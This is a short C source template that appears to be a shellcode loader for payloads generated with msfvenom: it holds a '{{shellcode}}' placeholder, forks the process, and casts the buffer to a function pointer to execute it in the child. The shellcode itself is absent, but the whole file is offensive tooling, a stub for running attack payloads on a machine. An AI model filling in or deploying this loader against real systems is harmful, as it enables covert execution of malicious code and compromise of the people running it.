#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our payload generated by msfvenom
int main (int argc, char **argv)
{
    {{shellcode}}
    // Run our shellcode
    if (fork() == 0){
        int (*ret)() = (int(*)())buf; 
        ret();
    }
}